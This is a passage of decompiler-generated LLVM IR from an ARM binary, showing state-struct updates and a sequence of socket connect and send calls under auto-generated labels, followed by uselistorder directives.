  store i1 %v7_108b8, i1* %cpsr_z.global-to-local, align 1
  %v2_108bc = add i32 %v0_108a8, 4
  %v3_108bc = inttoptr i32 %v2_108bc to i32*
  store i32 -1, i32* %v3_108bc, align 4
  %v0_108c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_108c0 = trunc i32 %v0_108c0 to i8
  %v2_108c0 = load i32, i32* @r6, align 4
  %v3_108c0 = add i32 %v2_108c0, 284
  %v4_108c0 = inttoptr i32 %v3_108c0 to i8*
  store i8 %v1_108c0, i8* %v4_108c0, align 1
  %v0_108c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_108c8 = load i32, i32* @r6, align 4
  br i1 %v0_108c4, label %dec_label_pc_108c8, label %dec_label_pc_1098c

dec_label_pc_108c8:                               ; preds = %dec_label_pc_10898
  %v1_108c8 = add i32 %v0_108c8, 24
  %v2_108c8 = inttoptr i32 %v1_108c8 to i32*
  %v3_108c8 = load i32, i32* %v2_108c8, align 4
  store i32 %v3_108c8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v3_108d8 = add i32 %v0_108c8, 284
  %v4_108d8 = inttoptr i32 %v3_108d8 to i8*
  store i8 0, i8* %v4_108d8, align 1
  %v0_108dc = load i32, i32* %r1.global-to-local, align 4
  %v1_108dc = load i32, i32* @r6, align 4
  %v2_108dc = add i32 %v1_108dc, 12
  %v3_108dc = inttoptr i32 %v2_108dc to i32*
  store i32 %v0_108dc, i32* %v3_108dc, align 4
  br label %dec_label_pc_105a4

dec_label_pc_108e4:                               ; preds = %dec_label_pc_ff9c
  br i1 %v2_ffc4, label %dec_label_pc_10b2c, label %dec_label_pc_108e8

dec_label_pc_108e8:                               ; preds = %dec_label_pc_108e4
  %v3_108e8 = icmp eq i32 %v5_ffc0, -1
  store i1 %v3_108e8, i1* %cpsr_c.global-to-local, align 1
  %v8_108e8 = icmp eq i32 %v5_ffc0, -1
  store i1 %v8_108e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_108e8, label %dec_label_pc_108f0, label %dec_label_pc_ffec

dec_label_pc_108f0:                               ; preds = %dec_label_pc_108e8
  store i32 %stack_var_-1868.0, i32* %r2.global-to-local, align 4
  %v2_108f4 = load i32, i32* %v2_ffa4, align 4
  store i32 %v2_108f4, i32* %r3.global-to-local, align 4
  %v2_108f8 = icmp ugt i32 %v2_108f4, 10
  store i1 %v2_108f8, i1* %cpsr_c.global-to-local, align 1
  %v7_108f8 = icmp eq i32 %v2_108f4, 11
  store i1 %v7_108f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108f8, label %dec_label_pc_fdbc, label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %dec_label_pc_108f0, %dec_label_pc_10b2c
  %v0_10900 = load i32, i32* @r6, align 4
  %v1_10900 = add i32 %v0_10900, 4
  %v2_10900 = inttoptr i32 %v1_10900 to i32*
  %v3_10900 = load i32, i32* %v2_10900, align 4
  store i32 %v3_10900, i32* %r0.global-to-local, align 4
  %v1_10904 = call i32 @function_11af0(i32 %v3_10900)
  store i32 %v1_10904, i32* %r0.global-to-local, align 4
  %v0_10908 = load i32, i32* @r6, align 4
  %v1_10908 = add i32 %v0_10908, 284
  %v2_10908 = inttoptr i32 %v1_10908 to i8*
  %v3_10908 = load i8, i8* %v2_10908, align 1
  %v4_10908 = zext i8 %v3_10908 to i32
  %v1_1090c = add nuw nsw i32 %v4_10908, 1
  %v1_10910 = urem i32 %v1_1090c, 256
  store i32 %v1_10910, i32* %r3.global-to-local, align 4
  %v2_10914 = icmp ugt i32 %v1_10910, 8
  store i1 %v2_10914, i1* %cpsr_c.global-to-local, align 1
  %v7_10914 = icmp eq i32 %v1_10910, 9
  store i1 %v7_10914, i1* %cpsr_z.global-to-local, align 1
  %v1_10918 = trunc i32 %v1_1090c to i8
  store i8 %v1_10918, i8* %v2_10908, align 1
  store i32 -1, i32* @r4, align 4
  %v0_10920 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10920 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10920 = xor i1 %v1_10920, true
  %v3_10920 = and i1 %v0_10920, %v2_10920
  br i1 %v3_10920, label %bb392, label %.thread251

.thread251:                                       ; preds = %dec_label_pc_10900
  %v1_10924247252 = load i32, i32* @r6, align 4
  %v2_10924248253 = add i32 %v1_10924247252, 4
  %v3_10924249254 = inttoptr i32 %v2_10924248253 to i32*
  store i32 -1, i32* %v3_10924249254, align 4
  br label %bb393

bb392:                                            ; preds = %dec_label_pc_10900
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10924243 = load i32, i32* @r6, align 4
  %v2_10924244 = add i32 %v1_10924243, 4
  %v3_10924245 = inttoptr i32 %v2_10924244 to i32*
  store i32 -1, i32* %v3_10924245, align 4
  %v4_10928 = load i32, i32* %r3.global-to-local, align 4
  %v5_10928 = load i32, i32* @r6, align 4
  %v6_10928 = add i32 %v5_10928, 12
  %v7_10928 = inttoptr i32 %v6_10928 to i32*
  store i32 %v4_10928, i32* %v7_10928, align 4
  %v4_1092c = load i32, i32* %r3.global-to-local, align 4
  %v5_1092c = trunc i32 %v4_1092c to i8
  %v6_1092c = load i32, i32* @r6, align 4
  %v7_1092c = add i32 %v6_1092c, 284
  %v8_1092c = inttoptr i32 %v7_1092c to i8*
  store i8 %v5_1092c, i8* %v8_1092c, align 1
  %v0_10930.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10930.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb393

bb393:                                            ; preds = %.thread251, %bb392
  %v1_10930 = phi i1 [ %v1_10930.pre, %bb392 ], [ %v1_10920, %.thread251 ]
  %v0_10930 = phi i1 [ %v0_10930.pre, %bb392 ], [ %v0_10920, %.thread251 ]
  %v2_10930 = xor i1 %v1_10930, true
  %v3_10930 = and i1 %v0_10930, %v2_10930
  br i1 %v3_10930, label %dec_label_pc_fdbc, label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %bb393
  %v0_10934 = load i32, i32* @r6, align 4
  store i32 %v0_10934, i32* @r0, align 4
  %v0_10938 = call i32 @function_f144()
  store i32 %v0_10938, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fdbc

dec_label_pc_10940:                               ; preds = %dec_label_pc_1081c
  store i32 %v2_1004c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_1094c = add i32 %v0_10808, 4
  %v2_1094c = inttoptr i32 %v1_1094c to i32*
  %v3_1094c = load i32, i32* %v2_1094c, align 4
  store i32 %v3_1094c, i32* %r0.global-to-local, align 4
  %v5_10950 = call i32 @function_12350(i32 %v3_1094c, i32* nonnull %stack_var_-41, i32 3, i32 16384)
  store i32 %v5_10950, i32* %r0.global-to-local, align 4
  store i32 %v2_107f4, i32* %r1.global-to-local, align 4
  %v0_10958 = load i32, i32* @r6, align 4
  %v1_10958 = add i32 %v0_10958, 4
  %v2_10958 = inttoptr i32 %v1_10958 to i32*
  %v3_10958 = load i32, i32* %v2_10958, align 4
  store i32 %v3_10958, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100e4

dec_label_pc_10968:                               ; preds = %dec_label_pc_ff8c
  store i32 %.pre, i32* @r0, align 4
  %v1_10970 = add i32 %v0_10968, 92
  store i32 %v1_10970, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_10978 = call i32 @function_12120(i32 %.pre, i32 %v1_10970, i32 192)
  store i32 %v3_10978, i32* %r0.global-to-local, align 4
  %v0_1097c = load i32, i32* @r6, align 4
  %v1_1097c = add i32 %v0_1097c, 24
  %v2_1097c = inttoptr i32 %v1_1097c to i32*
  %v3_1097c = load i32, i32* %v2_1097c, align 4
  store i32 %v3_1097c, i32* %r3.global-to-local, align 4
  %v1_10980 = add i32 %v3_1097c, -64
  store i32 %v1_10980, i32* %ip.global-to-local, align 4
  store i32 %v1_10980, i32* %v2_1097c, align 4
  br label %dec_label_pc_ff9c

dec_label_pc_1098c:                               ; preds = %dec_label_pc_10898
  store i32 %v0_108c8, i32* @r0, align 4
  %v0_10990 = call i32 @function_f144()
  store i32 %v0_10990, i32* %r0.global-to-local, align 4
  %v0_10994 = load i32, i32* @r6, align 4
  %v1_10994 = add i32 %v0_10994, 24
  %v2_10994 = inttoptr i32 %v1_10994 to i32*
  %v3_10994 = load i32, i32* %v2_10994, align 4
  store i32 %v3_10994, i32* %ip.global-to-local, align 4
  %v0_10998 = load i32, i32* @r4, align 4
  store i32 %v0_10998, i32* @r7, align 4
  br label %dec_label_pc_105a4

dec_label_pc_109a0:                               ; preds = %dec_label_pc_fea0, %dec_label_pc_fe58
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %dec_label_pc_fec8, %dec_label_pc_109a0
  %v0_109ac = phi i32 [ 0, %dec_label_pc_109a0 ], [ %v0_fea8, %dec_label_pc_fec8 ]
  %v0_109a4 = load i32, i32* @r6, align 4
  %v1_109a4 = add i32 %v0_109a4, 4
  %v2_109a4 = inttoptr i32 %v1_109a4 to i32*
  %v3_109a4 = load i32, i32* %v2_109a4, align 4
  store i32 %v3_109a4, i32* @r4, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_109ac = inttoptr i32 %v0_109a4 to i32*
  store i32 %v0_109ac, i32* %v2_109ac, align 4
  %v0_109b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_109b0 = load i32, i32* @r6, align 4
  %v2_109b0 = add i32 %v1_109b0, 24
  %v3_109b0 = inttoptr i32 %v2_109b0 to i32*
  store i32 %v0_109b0, i32* %v3_109b0, align 4
  %v0_fd98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fd98

dec_label_pc_109b8:                               ; preds = %thread-pre-split96
  %v0_109c0 = load i32, i32* @r6, align 4
  %v1_109c0 = add i32 %v0_109c0, 12
  %v2_109c0 = inttoptr i32 %v1_109c0 to i32*
  %v3_109c0 = load i32, i32* %v2_109c0, align 4
  br label %dec_label_pc_ff84.backedge

dec_label_pc_109c8:                               ; preds = %dec_label_pc_fe18
  %v0_109c8 = load i32, i32* @r6, align 4
  %v1_109c8 = add i32 %v0_109c8, 4
  %v2_109c8 = inttoptr i32 %v1_109c8 to i32*
  %v3_109c8 = load i32, i32* %v2_109c8, align 4
  store i32 %v3_109c8, i32* %r0.global-to-local, align 4
  %v1_109cc = call i32 @function_11af0(i32 %v3_109c8)
  store i32 %v1_109cc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_109d4 = load i32, i32* @r5, align 4
  %v1_109d4 = load i32, i32* @r6, align 4
  %v2_109d4 = add i32 %v1_109d4, 12
  %v3_109d4 = inttoptr i32 %v2_109d4 to i32*
  store i32 %v0_109d4, i32* %v3_109d4, align 4
  %v0_109d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_109d8 = load i32, i32* @r6, align 4
  %v2_109d8 = add i32 %v1_109d8, 4
  %v3_109d8 = inttoptr i32 %v2_109d8 to i32*
  store i32 %v0_109d8, i32* %v3_109d8, align 4
  %v0_109dc = load i32, i32* @r5, align 4
  %v1_109dc = trunc i32 %v0_109dc to i8
  %v2_109dc = load i32, i32* @r6, align 4
  %v3_109dc = add i32 %v2_109dc, 284
  %v4_109dc = inttoptr i32 %v3_109dc to i8*
  store i8 %v1_109dc, i8* %v4_109dc, align 1
  br label %dec_label_pc_fdbc

dec_label_pc_109e4:                               ; preds = %dec_label_pc_ff40
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_109e8 = call i32 @function_10b68(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_109f0 = call i32 @function_10b68(i32 27)
  store i32 %v1_109f0, i32* %r0.global-to-local, align 4
  %v0_109f4 = load i32, i32* @r6, align 4
  %v1_109f4 = add i32 %v0_109f4, 12
  %v2_109f4 = inttoptr i32 %v1_109f4 to i32*
  %v3_109f4 = load i32, i32* %v2_109f4, align 4
  br label %dec_label_pc_ff84.backedge

dec_label_pc_ff84.backedge.thread:                ; preds = %dec_label_pc_10264, %dec_label_pc_10318, %dec_label_pc_105c8, %dec_label_pc_1067c, %dec_label_pc_10730
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ff8c

dec_label_pc_ff84.backedge.thread500:             ; preds = %dec_label_pc_10290, %dec_label_pc_103bc, %dec_label_pc_1075c, %dec_label_pc_105f4, %dec_label_pc_106a8, %dec_label_pc_102ac, %dec_label_pc_103d8, %dec_label_pc_10610, %dec_label_pc_106c4, %dec_label_pc_10778
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ff8c

dec_label_pc_ff84.backedge:                       ; preds = %dec_label_pc_109e4, %dec_label_pc_109b8
  %storemerge503 = phi i32 [ %v3_109c0, %dec_label_pc_109b8 ], [ %v3_109f4, %dec_label_pc_109e4 ]
  %v0_ff84.be = phi i32 [ %v3_109c0, %dec_label_pc_109b8 ], [ %v3_109f4, %dec_label_pc_109e4 ]
  %v0_ff8c151 = phi i32 [ %v0_109c0, %dec_label_pc_109b8 ], [ %v0_109f4, %dec_label_pc_109e4 ]
  store i32 %storemerge503, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff84 = icmp eq i32 %v0_ff84.be, 0
  store i1 %v2_ff84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff84, label %dec_label_pc_fdbc, label %dec_label_pc_ff8c

dec_label_pc_109fc:                               ; preds = %dec_label_pc_10534
  store i32 2, i32* @r6, align 4
  %v1_10a00 = add i32 %v3_10540, 4
  %v2_10a00 = inttoptr i32 %v1_10a00 to i32*
  %v3_10a00 = load i32, i32* %v2_10a00, align 4
  store i32 %v3_10a00, i32* @r4, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v0_10a0c = call i32 @function_e978()
  store i32 %v0_10a0c, i32* %r0.global-to-local, align 4
  %v0_10a10 = load i32, i32* @r8, align 4
  %v1_10a10 = inttoptr i32 %v0_10a10 to i8*
  %v2_10a10 = load i8, i8* %v1_10a10, align 1
  %v3_10a10 = zext i8 %v2_10a10 to i32
  store i32 %v3_10a10, i32* %r1.global-to-local, align 4
  %v2_10a14 = call i32 @function_11878(i32 %v0_10a0c, i32 %v3_10a10)
  store i32 %v2_10a14, i32* %r0.global-to-local, align 4
  %v0_10a18 = load i32, i32* @r4, align 4
  %v2_10a18 = and i32 %v2_10a14, 1073741824
  %v3_10a18 = icmp ne i32 %v2_10a18, 0
  store i1 %v3_10a18, i1* %cpsr_c.global-to-local, align 1
  %v4_10a18 = mul i32 %v2_10a14, 4
  %v5_10a18 = add i32 %v0_10a18, %v4_10a18
  %v6_10a18 = inttoptr i32 %v5_10a18 to i32*
  %v7_10a18 = load i32, i32* %v6_10a18, align 4
  store i32 %v7_10a18, i32* %r3.global-to-local, align 4
  %v0_10a1c = load i32, i32* @sl, align 4
  store i32 %v0_10a1c, i32* %r1.global-to-local, align 4
  %v0_10a20 = load i32, i32* @r6, align 4
  store i32 %v0_10a20, i32* %r0.global-to-local, align 4
  %v2_10a28 = inttoptr i32 %v0_10a1c to i32*
  %v3_10a28 = call i32 @function_10b3c(i32 %v0_10a20, i32* %v2_10a28)
  %v4_10a28 = inttoptr i32 %v3_10a28 to i8*
  store i32 %v3_10a28, i32* %r0.global-to-local, align 4
  %v2_10a2c = add i32 %v3_10a28, 1
  %v3_10a2c = inttoptr i32 %v2_10a2c to i8*
  %v4_10a2c = load i8, i8* %v3_10a2c, align 1
  %v5_10a2c = zext i8 %v4_10a2c to i32
  store i32 %v5_10a2c, i32* %r2.global-to-local, align 4
  %v3_10a30 = load i8, i8* %v4_10a28, align 1
  %v4_10a30 = zext i8 %v3_10a30 to i32
  %v4_10a34 = mul nuw nsw i32 %v5_10a2c, 256
  %v5_10a34 = or i32 %v4_10a30, %v4_10a34
  store i32 %v5_10a34, i32* %r3.global-to-local, align 4
  %v1_10a38 = and i32 %v4_10a30, 128
  %v2_10a38 = icmp ne i32 %v1_10a38, 0
  store i1 %v2_10a38, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_10a2c, i32* %r1.global-to-local, align 4
  %v0_10a3c = load i32, i32* @r8, align 4
  store i32 %v0_10a3c, i32* %r0.global-to-local, align 4
  %v6_10a48 = call i32 @function_ebdc(i32 %v0_10a3c)
  %v0_10a4c = load i32, i32* @r6, align 4
  store i32 %v0_10a4c, i32* %r0.global-to-local, align 4
  %v1_10a50 = call i32 @function_10b68(i32 %v0_10a4c)
  %v0_10a58 = load i32, i32* @r5, align 4
  store i32 %v0_10a58, i32* %r0.global-to-local, align 4
  store i32 %v2_10a5c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_10a64 = call i32 @function_1223c(i32 %v0_10a58, %sockaddr* %v3_10a64, i32 16)
  store i32 %v4_10a64, i32* %r0.global-to-local, align 4
  %v3_10a68 = icmp eq i32 %v4_10a64, -1
  store i1 %v3_10a68, i1* %cpsr_c.global-to-local, align 1
  %v8_10a68 = icmp eq i32 %v4_10a64, -1
  store i1 %v8_10a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10a68, label %dec_label_pc_10a70, label %dec_label_pc_10a80

dec_label_pc_10a70:                               ; preds = %dec_label_pc_109fc
  %v0_10a70 = load i32, i32* @r5, align 4
  store i32 %v0_10a70, i32* %r0.global-to-local, align 4
  %v1_10a74 = call i32 @function_11af0(i32 %v0_10a70)
  %v0_10a78 = load i32, i32* @sl, align 4
  store i32 %v0_10a78, i32* %r0.global-to-local, align 4
  %v1_10a7c = call i32 @function_12e68(i32 %v0_10a78)
  store i32 %v1_10a7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %dec_label_pc_109fc, %dec_label_pc_10a70
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10a90 = load i32, i32* @r5, align 4
  store i32 %v0_10a90, i32* %r0.global-to-local, align 4
  %v0_10a94 = load i32, i32* @sl, align 4
  store i32 %v0_10a94, i32* %stack_var_-56, align 4
  %v6_10a98 = call i32 @function_12350(i32 %v0_10a90, i32* nonnull %stack_var_-56, i32 1, i32 16384)
  store i32 %v2_103f8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10aac = load i32, i32* @r5, align 4
  store i32 %v0_10aac, i32* %r0.global-to-local, align 4
  %v5_10ab0 = call i32 @function_12350(i32 %v0_10aac, i32* nonnull %stack_var_-48, i32 4, i32 16384)
  %v0_10ab8 = load i32, i32* @r6, align 4
  store i32 %v0_10ab8, i32* %r2.global-to-local, align 4
  store i32 %v2_10abc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10ac4 = load i32, i32* @r5, align 4
  store i32 %v0_10ac4, i32* %r0.global-to-local, align 4
  %v5_10ac8 = call i32 @function_12350(i32 %v0_10ac4, i32* nonnull %stack_var_-38, i32 %v0_10ab8, i32 16384)
  %v0_10acc = load i32, i32* @fp, align 4
  %v1_10acc = add i32 %v0_10acc, 12
  store i32 %v1_10acc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10ad8 = load i32, i32* @r5, align 4
  store i32 %v0_10ad8, i32* %r0.global-to-local, align 4
  %v4_10adc = inttoptr i32 %v1_10acc to i32*
  %v5_10adc = call i32 @function_12350(i32 %v0_10ad8, i32* %v4_10adc, i32 1, i32 16384)
  store i32 %v5_10adc, i32* %r0.global-to-local, align 4
  %v0_10ae0 = load i32, i32* @fp, align 4
  %v1_10ae0 = inttoptr i32 %v0_10ae0 to i32*
  %v2_10ae0 = load i32, i32* %v1_10ae0, align 4
  store i32 %v2_10ae0, i32* %r1.global-to-local, align 4
  %v1_10ae4 = add i32 %v0_10ae0, 12
  %v2_10ae4 = inttoptr i32 %v1_10ae4 to i8*
  %v3_10ae4 = load i8, i8* %v2_10ae4, align 1
  %v4_10ae4 = zext i8 %v3_10ae4 to i32
  store i32 %v4_10ae4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10aec = load i32, i32* @r5, align 4
  store i32 %v0_10aec, i32* %r0.global-to-local, align 4
  %v4_10af0 = inttoptr i32 %v2_10ae0 to i32*
  %v5_10af0 = call i32 @function_12350(i32 %v0_10aec, i32* %v4_10af0, i32 %v4_10ae4, i32 16384)
  %v0_10af4 = load i32, i32* @fp, align 4
  %v1_10af4 = add i32 %v0_10af4, 13
  store i32 %v1_10af4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10b00 = load i32, i32* @r5, align 4
  store i32 %v0_10b00, i32* %r0.global-to-local, align 4
  %v4_10b04 = inttoptr i32 %v1_10af4 to i32*
  %v5_10b04 = call i32 @function_12350(i32 %v0_10b00, i32* %v4_10b04, i32 1, i32 16384)
  %v0_10b08 = load i32, i32* @r5, align 4
  store i32 %v0_10b08, i32* %r0.global-to-local, align 4
  %v0_10b0c = load i32, i32* @fp, align 4
  %v1_10b0c = add i32 %v0_10b0c, 13
  %v2_10b0c = inttoptr i32 %v1_10b0c to i8*
  %v3_10b0c = load i8, i8* %v2_10b0c, align 1
  %v4_10b0c = zext i8 %v3_10b0c to i32
  store i32 %v4_10b0c, i32* %r2.global-to-local, align 4
  %v1_10b10 = add i32 %v0_10b0c, 4
  %v2_10b10 = inttoptr i32 %v1_10b10 to i32*
  %v3_10b10 = load i32, i32* %v2_10b10, align 4
  store i32 %v3_10b10, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10b18 = inttoptr i32 %v3_10b10 to i32*
  %v5_10b18 = call i32 @function_12350(i32 %v0_10b08, i32* %v4_10b18, i32 %v4_10b0c, i32 16384)
  %v0_10b1c = load i32, i32* @r5, align 4
  store i32 %v0_10b1c, i32* %r0.global-to-local, align 4
  %v1_10b20 = call i32 @function_11af0(i32 %v0_10b1c)
  store i32 %v1_10b20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b24

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10518, %dec_label_pc_10a80
  %v0_10b24 = load i32, i32* @sl, align 4
  store i32 %v0_10b24, i32* %r0.global-to-local, align 4
  %v1_10b28 = call i32 @function_12e68(i32 %v0_10b24)
  store i32 %v1_10b28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b2c

dec_label_pc_10b2c:                               ; preds = %dec_label_pc_108e4, %dec_label_pc_10b24
  store i32 %stack_var_-1868.0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_ffa4, align 4
  br label %dec_label_pc_10900

; uselistorder directives
  uselistorder i32 %v4_10a30, { 1, 0 }
  uselistorder i32 %v5_10a2c, { 1, 0, 2 }
  uselistorder i32 %v2_10a14, { 1, 0, 2 }
  uselistorder i32 %v3_109f4, { 1, 0 }
  uselistorder i32 %v3_109c0, { 1, 0 }
  uselistorder i32 %v3_10958, { 1, 0 }
  uselistorder i1 %v1_10920, { 1, 0 }
  uselistorder i32 %v1_10910, { 2, 1, 0 }
  uselistorder i32 %v1_1090c, { 1, 0 }
  uselistorder i32 %v0_108c8, { 1, 0, 2 }
  uselistorder i32 %v1_108b0, { 2, 1, 0 }
  uselistorder i32 %v0_1088c, { 0, 2, 1 }
  uselistorder i1 %v0_1087c, { 1, 0 }
  uselistorder i32 %v4_10870, { 1, 0, 2 }
  uselistorder i32 %v0_10808, { 1, 2, 0 }
  uselistorder i1 %v7_1077c, { 1, 0 }
  uselistorder i32 %v1_10778, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10770, { 1, 0 }
  uselistorder i8 %v3_10768, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10778, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10754, { 1, 0 }
  uselistorder i1 %v7_1074c, { 1, 0 }
  uselistorder i1 %v7_10744, { 1, 0 }
  uselistorder i1 %v7_106c8, { 1, 0 }
  uselistorder i32 %v1_106c4, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_106bc, { 1, 0 }
  uselistorder i8 %v3_106b4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_106c4, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_106a0, { 1, 0 }
  uselistorder i1 %v7_10698, { 1, 0 }
  uselistorder i1 %v7_10690, { 1, 0 }
  uselistorder i1 %v7_10614, { 1, 0 }
  uselistorder i32 %v1_10610, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10608, { 1, 0 }
  uselistorder i8 %v3_10600, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10610, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_105ec, { 1, 0 }
  uselistorder i1 %v7_105e4, { 1, 0 }
  uselistorder i1 %v7_105dc, { 1, 0 }
  uselistorder i32 %v0_105b8, { 1, 2, 0 }
  uselistorder i32 %v2_105a4, { 1, 0 }
  uselistorder i32 %v1_105a4, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_105a4, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i32 %v4_10574, { 1, 0 }
  uselistorder i32 %v5_10570, { 1, 0, 2 }
  uselistorder i1 %v7_10528, { 1, 0 }
  uselistorder i32 %v3_10524, { 1, 0, 2, 3 }
  uselistorder i1 %v2_10510, { 1, 0 }
  uselistorder i32 %.398, { 1, 0 }
  uselistorder i1 %v7_104f8, { 1, 0 }
  uselistorder i32 %v0_104f4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_104d4, { 1, 0, 2 }
  uselistorder i32 %v4_104d0, { 1, 0, 2 }
  uselistorder i1 %v7_104c0, { 1, 0 }
  uselistorder i32 %v0_104c0, { 3, 2, 0, 4, 1 }
  uselistorder i1 %v7_103dc, { 1, 0 }
  uselistorder i32 %v1_103d8, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_103d0, { 1, 0 }
  uselistorder i8 %v3_103c8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_103d8, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_103b4, { 1, 0 }
  uselistorder i1 %v7_103ac, { 1, 0 }
  uselistorder i1 %v7_103a4, { 1, 0 }
  uselistorder i1 %v7_102b0, { 1, 0 }
  uselistorder i32 %v1_102ac, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_102a4, { 1, 0 }
  uselistorder i8 %v3_1029c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_102ac, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10288, { 1, 0 }
  uselistorder i1 %v7_10280, { 1, 0 }
  uselistorder i1 %v7_10278, { 1, 0 }
  uselistorder i32 %v0_10220, { 2, 1, 0 }
  uselistorder i1 %v7_10210, { 1, 0 }
  uselistorder i1 %v8_10204, { 1, 0 }
  uselistorder i8 %v3_101fc, { 4, 5, 6, 7, 8, 3, 2, 1, 0 }
  uselistorder i32 %v0_1020c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_101e8, { 1, 0 }
  uselistorder i1 %v7_101e0, { 1, 0 }
  uselistorder i32 %v0_10188, { 2, 1, 0 }
  uselistorder i1 %v7_10170, { 1, 0 }
  uselistorder i1 %v8_10164, { 1, 0 }
  uselistorder i8 %v3_1015c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1016c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10148, { 1, 0 }
  uselistorder i1 %v7_10140, { 1, 0 }
  uselistorder i1 %v7_10138, { 1, 0 }
  uselistorder i32 %v0_10114.pre, { 0, 2, 1 }
  uselistorder i32 %v1_100fc, { 1, 0 }
  uselistorder i32 %v1_100f8, { 1, 0 }
  uselistorder i32 %v1_100f0, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_100ec, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_100ec, { 0, 2, 1 }
  uselistorder i1 %v7_10094, { 1, 0 }
  uselistorder i1 %v2_10080, { 1, 0, 2 }
  uselistorder i1 %v2_10068, { 1, 0, 2 }
  uselistorder i32 %v1_10088, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_1005c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v1_10084, { 1, 0 }
  uselistorder i32 %v2_1008c, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_10004, { 4, 17, 5, 19, 6, 18, 7, 16, 8, 15, 9, 14, 10, 13, 3, 2, 11, 12, 20, 1, 0 }
  uselistorder i32 %v1_ffe0, { 1, 2, 3, 0 }
  uselistorder i32 %v3_ffdc, { 1, 0 }
